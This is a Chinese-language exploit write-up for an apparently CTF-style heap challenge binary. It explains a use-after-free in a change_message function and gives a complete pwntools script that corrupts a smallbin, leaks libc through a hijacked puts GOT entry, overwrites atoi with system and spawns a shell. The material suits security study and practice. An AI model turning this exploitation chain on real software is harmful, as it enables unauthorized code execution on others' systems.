# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，动态链接（exp中使用了`elf.libc`和GOT表操作）
- **安全机制**：从代码推断，可能未启用PIE（地址如`0x6020A0`固定），堆栈保护未知（需实际checksec验证）
- **依赖库**：标准C库（libc），exp中依赖libc符号计算地址
- **运行要求**：需要交互式输入，通过菜单操作堆内存（分配、编辑、释放）

## 漏洞成因
### 关键结构体分析
程序使用以下全局变量管理堆内存：
- `page_list[8]`（地址`0x602100`）：存储指向堆chunk的指针数组
- `size_list[8]`（地址`0x602140`）：存储对应page的大小数组  
- `name`（地址`0x6020A0`）：32字节用户名字符串
- `message`（地址`0x6020E0`）：指向动态分配的0xB0字节堆chunk

### 漏洞分析
**漏洞类型**：Use-After-Free (UAF)  
**漏洞位置**：`change_message`函数（反编译代码第90-113行）  
**漏洞成因**：
1. 函数首先调用`free(message)`释放message指向的堆chunk
2. 随后分配新chunk并更新message指针
3. **关键问题**：在更新message指针前，执行`read(0, message, 0x10u)`向已释放的message chunk写入数据
4. 这导致UAF漏洞，攻击者可以在chunk被free后继续修改其内容，破坏堆元数据

## 漏洞利用过程
### 利用步骤与内存变化

| 步骤 | 操作 | 关键内存变化 | 利用目的 |
|------|------|--------------|----------|
| 1 | 初始化：分配page 0 (0xC8字节) | - page_list[0] = 堆地址<br>- message chunk分配在堆起始处 | 建立基础堆布局 |
| 2 | 调用change_message(200, "11", payload) | - message chunk被free<br>- 修改smallbin bk指针为GOT地址(0x602090)<br>- 泄露堆地址 | 利用UAF修改smallbin链表，建立GOT指向 |
| 3 | 修改name变量构造指针链 | - name内容被覆盖为精心构造的指针链<br>- 包含main_arena地址和自引用指针 | 为后续任意地址分配准备数据结构 |
| 4 | 连续分配两个0xB0字节chunk | - page_list[1]和page_list[2]被填充<br>- 利用被破坏的smallbin获取控制权 | 通过被修改的smallbin分配得到GOT区域控制 |
| 5 | 编辑page 2写入复杂payload | - page_list数组被劫持指向GOT表<br>- 构造fake chunk结构 | 建立任意地址读写能力 |
| 6 | 编辑page 0覆盖GOT条目 | - puts GOT被修改为puts@plt地址(0x4006A0) | 首次GOT劫持，准备信息泄露 |
| 7 | 删除page 1触发函数调用 | - 调用被劫持的puts函数<br>- 泄露libc地址 | 获取libc基址计算关键函数地址 |
| 8-9 | 计算system地址并覆盖atoi GOT | - atoi GOT被修改为system地址<br>- 建立代码执行通道 | 完成GOT劫持，准备shell执行 |
| 10 | 发送"/bin/sh"字符串 | - 作为atoi输入，实际执行system("/bin/sh") | 触发shell执行 |
| 11 | 进入交互模式 | - 进程被替换为/bin/dash<br>- 获得完整shell控制权 | 攻击成功 |

### 堆内存演变关键点
- **初始状态**：message chunk和page chunk连续分配
- **UAF利用后**：smallbin链表被破坏，bk指向GOT表，fd被数据覆盖
- **最终状态**：GOT表被完全控制，堆布局被彻底破坏，进程被替换

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample26')
libc = elf.libc
p = process("./data/sample26")

# 获取GOT表地址用于后续利用
free_got = elf.got['free']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']

def add(size):
    p.sendline(b'1')
    p.sendafter(b'size:\n',str(size).encode('utf-8'))

def dele(idx):
    p.sendline(b'3')
    p.send(str(idx).encode('utf-8'))

def edit(idx,context):
    p.sendline(b'2')
    p.sendline(str(idx).encode('utf-8'))
    p.send(context)

def change_name(name):
    p.sendline(b'4')
    p.send(name)

def change_mesg(size,new_mesg,mesg):
    p.sendline(b'5')
    p.recvuntil(b'saved at ')
    a = p.recvline()[:-1]
    print('leak--->',a)
    heap_addr = int(a,16)
    # 构造payload修改smallbin的bk指针指向GOT表
    payload = p64(heap_addr+0xb0+0xd0)
    mesg = payload + mesg
    print('---->',hex(heap_addr))
    p.send(str(size).encode('utf-8'))
    p.send(new_mesg)
    # 利用UAF漏洞向已释放的chunk写入恶意数据
    p.send(mesg)
    return a

# 步骤1: 初始化堆布局
p.sendlineafter(b'writer:\n',b'a')
p.sendlineafter(b'book?\n',b'a')
add(0xC8)

# 步骤2: 利用UAF漏洞修改smallbin链表
payload = p64(0x6020A0-0x10)
heap_addr = change_mesg(200,b'11',payload)
heap_addr = int(heap_addr,16)

# 步骤3: 构造name中的指针链为后续利用准备
payload = p64(heap_addr-0x10)+p64(0x6020A0+0x8)+p64(0)+p64(0x6020A0-0x10)
change_name(payload)

# 步骤4: 通过被破坏的smallbin分配chunk，获得GOT控制
add(0xb0)
add(0xb0)

# 步骤5: 构造复杂payload劫持page_list指向GOT表
payload = b'a'*0x40+p64(heap_addr+0xb0+0xc0+0xd0)+b'a'*0x18+p64(free_got)+p64(puts_got)+p64(atoi_got)
edit(2,payload)

# 步骤6: 首次GOT覆盖，将puts GOT改为plt地址
edit(0,p64(0x4006A0))

# 步骤7: 触发被劫持的puts函数泄露libc地址
dele(1)
p.recvuntil(b'delete?\n')
puts_addr = p.recvline()[:-1]

# 步骤8-9: 计算system地址并覆盖atoi GOT
puts_addr = int.from_bytes(puts_addr,'little')
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']
edit(2,p64(system_addr))

# 步骤10: 发送"/bin/sh"触发system执行
p.send(b'/bin/sh\x00')

# 步骤11: 获得shell控制权
p.interactive()
```

### 关键注释说明
- **UAF利用点**：`change_mesg`函数中向已释放chunk写入数据，修改smallbin链表
- **信息泄露**：通过被劫持的puts函数泄露libc地址，计算关键函数偏移
- **GOT劫持**：分两步覆盖GOT条目，最终将atoi替换为system实现代码执行
- **堆风水**：精心控制堆布局，利用smallbin机制实现任意地址分配

该漏洞利用展示了典型的UAF漏洞利用链：信息泄露→堆布局控制→任意地址读写→GOT劫持→代码执行。
